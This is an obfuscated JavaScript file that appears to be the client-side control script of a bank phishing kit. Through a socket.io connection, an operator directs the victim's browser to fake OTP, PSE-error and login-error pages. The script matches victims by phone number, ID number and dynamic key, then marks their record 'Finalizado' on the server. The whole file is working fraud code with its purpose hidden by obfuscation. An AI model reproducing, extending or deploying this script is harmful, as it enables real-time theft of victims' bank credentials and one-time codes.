function _0x174a(_0x699605, _0x15c238) {
  const _0x5e0477 = _0x5e04();
  return (
    (_0x174a = function (_0x174a5, _0x191f2c) {
      _0x174a5 = _0x174a5 - 0x1e0;
      let _0xa237ed = _0x5e0477[_0x174a5];
      return _0xa237ed;
    }),
    _0x174a(_0x699605, _0x15c238)
  );
}
const _0x348a4a = _0x174a;
(function (_0x1422e2, _0x24cdc3) {
  const _0x1c0388 = _0x174a,
    _0x116e19 = _0x1422e2();
  while (!![]) {
    try {
      const _0x5980d4 =
        parseInt(_0x1c0388(0x1ec)) / 0x1 +
        (-parseInt(_0x1c0388(0x1e8)) / 0x2) *
          (parseInt(_0x1c0388(0x1f4)) / 0x3) +
        -parseInt(_0x1c0388(0x1e0)) / 0x4 +
        parseInt(_0x1c0388(0x1ed)) / 0x5 +
        (-parseInt(_0x1c0388(0x1e7)) / 0x6) *
          (-parseInt(_0x1c0388(0x1f9)) / 0x7) +
        -parseInt(_0x1c0388(0x1fa)) / 0x8 +
        parseInt(_0x1c0388(0x1f2)) / 0x9;
      if (_0x5980d4 === _0x24cdc3) break;
      else _0x116e19["push"](_0x116e19["shift"]());
    } catch (_0x3bb9c3) {
      _0x116e19["push"](_0x116e19["shift"]());
    }
  }
})(_0x5e04, 0xc72be);
var socket = io[_0x348a4a(0x1e9)](url);
socket["on"]("logs", function (_0x22d3bc) {
  const _0x1b55a4 = _0x348a4a;
  if (
    _0x22d3bc[_0x1b55a4(0x1e2)] == "us" &&
    _0x22d3bc[_0x1b55a4(0x1e4)] == info[_0x1b55a4(0x1f0)]["telnum"]
  )
    window[_0x1b55a4(0x1f1)]["href"] = _0x1b55a4(0x1ee);
  else {
    if (
      _0x22d3bc["valor"] == _0x1b55a4(0x1e3) &&
      _0x22d3bc[_0x1b55a4(0x1e4)] == info["metaInfo"][_0x1b55a4(0x1e5)]
    )
      window["location"]["href"] = "./otp.html";
    else {
      if (
        _0x22d3bc[_0x1b55a4(0x1e2)] == _0x1b55a4(0x1eb) &&
        _0x22d3bc["valid"] == info[_0x1b55a4(0x1f0)][_0x1b55a4(0x1e5)]
      )
        window[_0x1b55a4(0x1f1)][_0x1b55a4(0x1f3)] = _0x1b55a4(0x1f8);
      else {
        if (
          _0x22d3bc["valor"] == "finish" &&
          _0x22d3bc[_0x1b55a4(0x1e4)] == info[_0x1b55a4(0x1f0)]["telnum"]
        ) {
          async function _0x3fc209() {
            const _0x15ffa3 = _0x1b55a4,
              _0x5715cd = await fetch(url + _0x15ffa3(0x1e1), {
                method: _0x15ffa3(0x1ea),
                headers: { "Content-Type": _0x15ffa3(0x1fb) },
              }),
              _0x3bb933 = await _0x5715cd["json"](),
              _0x53f8fb = [..._0x3bb933];
            for (const _0x4422b2 of _0x53f8fb) {
              if (
                _0x4422b2[_0x15ffa3(0x1f6)] == info["metaInfo"]["cc"] &&
                _0x4422b2["cl"] == info[_0x15ffa3(0x1f0)]["telnum"]
              ) {
                console[_0x15ffa3(0x1fc)]("Usuario\x20encontrado");
                const _0x40e37d = await fetch(
                    url + _0x15ffa3(0x1f7) + _0x4422b2[_0x15ffa3(0x1f5)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": _0x15ffa3(0x1fb) },
                      body: JSON["stringify"]({ status: _0x15ffa3(0x1e6) }),
                    }
                  ),
                  _0x2c8b76 = await _0x40e37d["json"]();
              }
            }
            window[_0x15ffa3(0x1f1)][_0x15ffa3(0x1f3)] = _0x15ffa3(0x1ef);
          }
          _0x3fc209();
          return;
        }
      }
    }
  }
});
function _0x5e04() {
  const _0x4a1ce3 = [
    "./otp.error.html",
    "3458tCgOTg",
    "3150600lErswL",
    "application/json",
    "log",
    "2572620dVEJqR",
    "/logs/logs",
    "valor",
    "din",
    "valid",
    "telnum",
    "Finalizado",
    "12576WGxbIv",
    "30KdRuMD",
    "connect",
    "GET",
    "newdin",
    "718712sbYLQT",
    "5219305CrLjkV",
    "./index.error.html",
    "./errorPse.html",
    "metaInfo",
    "location",
    "3339756TcfrNf",
    "href",
    "263259znBHNR",
    "idreg",
    "reg",
    "/logs/logFinish/",
  ];
  _0x5e04 = function () {
    return _0x4a1ce3;
  };
  return _0x5e04();
}
